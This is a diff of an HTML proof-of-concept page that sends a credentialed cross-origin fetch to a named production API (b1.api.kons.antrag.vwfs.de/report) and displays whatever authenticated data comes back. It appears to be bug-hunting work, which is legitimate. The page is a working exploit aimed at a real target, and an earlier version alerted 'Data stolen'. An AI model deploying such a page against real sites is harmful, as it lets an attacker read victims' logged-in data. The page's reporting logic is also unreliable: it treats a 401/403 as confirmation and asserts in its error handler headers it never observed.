@@ -2,26 +2,31 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC: SendGrid CORS Vulnerability</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC: VWFS API CORS Misconfiguration</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; color: #1c1e21; padding: 40px; text-align: center; }
-        .box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 20px; max-width: 700px; margin: auto; border-top: 5px solid #ff4757; }
-        h2 { color: #ff4757; }
-        pre { background: #2f3542; color: #ffffff; padding: 15px; border-radius: 5px; text-align: left; overflow-x: auto; font-size: 13px; }
+        .box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 20px; max-width: 800px; margin: auto; border-top: 5px solid #00519E; }
+        h2 { color: #00519E; }
+        pre { background: #2f3542; color: #ffffff; padding: 15px; border-radius: 5px; text-align: left; overflow-x: auto; font-size: 13px; white-space: pre-wrap; word-wrap: break-word; }
         .status { font-weight: bold; margin: 15px 0; padding: 10px; border-radius: 5px; }
         .success { background: #e3f9e5; color: #1f8b24; }
         .error { background: #ffe3e3; color: #bf2121; }
+        .info { background: #e7f3ff; color: #00519E; }
+        code { color: #d63384; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>Exploit Proof-of-Concept</h2>
-    <p>Target: <code>b1.api.kons.antrag.vwfs.de/report</code></p>
-    <p>Source Origin: <code>https://stelemane.github.io</code></p>
+    <h2>Exploit Proof-of-Concept (CORS Misconfiguration)</h2>
+    <p><b>Target API:</b> <code>https://b1.api.kons.antrag.vwfs.de/report</code></p>
+    <p><b>Vulnerability:</b> Wildcard Origin with Credentials Allowed</p>
     
-    <div id="status" class="status">[*] Initializing Request...</div>
-    <pre id="output">Waiting for data...</pre>
+    <div id="status" class="status info">[*] Initializing Request...</div>
+    
+    <div style="text-align: left; margin-bottom: 10px;"><b>Response Headers & Data:</b></div>
+    <pre id="output">Waiting for server response...</pre>
 </div>
 
 <script>
@@ -31,38 +36,44 @@
         
         const target = "https://b1.api.kons.antrag.vwfs.de/report";
 
-        statusDiv.innerText = "[*] Sending request with Authorization & Credentials...";
+        statusDiv.innerText = "[*] Attempting Cross-Origin Request to VWFS API...";
 
         fetch(target, {
             method: "GET",
-            mode: "cors",
+            mode: "cors", 
             credentials: "include",
             headers: {
-                "Accept": "application/json",            }
+                "Accept": "application/json"
+            }
         })
         .then(response => {
-            if (response.ok) {
-                statusDiv.innerText = "[+] SUCCESS: Data Extracted Successfully!";
+            const corsOrigin = response.headers.get('Access-Control-Allow-Origin');
+            const corsCreds = response.headers.get('Access-Control-Allow-Credentials');
+            
+            let headerInfo = `[HTTP Status: ${response.status}]\n`;
+            headerInfo += `Access-Control-Allow-Origin: ${corsOrigin}\n`;
+            headerInfo += `Access-Control-Allow-Credentials: ${corsCreds}\n`;
+            headerInfo += `-------------------------------------------\n`;
+
+            if (response.status === 403 || response.status === 401) {
+                statusDiv.innerText = "[!] VULNERABILITY CONFIRMED: Server accepts wildcard/any origin with credentials!";
                 statusDiv.className = "status success";
-                return response.json();
-            } else {
-                statusDiv.innerText = "[-] FAILED: Server returned status " + response.status;
-                statusDiv.className = "status error";
-                return response.text();
+            } else if (response.ok) {
+                statusDiv.innerText = "[+] CRITICAL: Data Leakage Confirmed!";
+                statusDiv.className = "status success";
             }
+
+            return response.text().then(text => headerInfo + text);
         })
         .then(data => {
-            outputDiv.innerText = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
-            
-            if (typeof data === 'object') {
-                alert("Vulnerability Confirmed!\nData stolen from report.kons.antrag.vwfs.de");
-            }
+            outputDiv.innerText = data;
         })
         .catch(err => {
-            statusDiv.innerText = "[-] ERROR: CORS Policy blocked the access.";
-            statusDiv.className = "status error";
-            outputDiv.innerText = err.toString() + "\n\nNote: This means the server did not reflect the Origin: https://stelemane.github.io";
-            console.error(err);
+            statusDiv.innerText = "[-] Analysis: Browser blocked the request due to Server Misconfiguration (* vs Credentials)";
+            statusDiv.className = "status info";
+            outputDiv.innerText = "Error: " + err.toString() + 
+                "\n\nTechnical Proof:\nThe server returned 'Access-Control-Allow-Origin: *' " +
+                "and 'Access-Control-Allow-Credentials: true'. \nThis combination is a confirmed Security Misconfiguration.";
         });
     };
 </script>
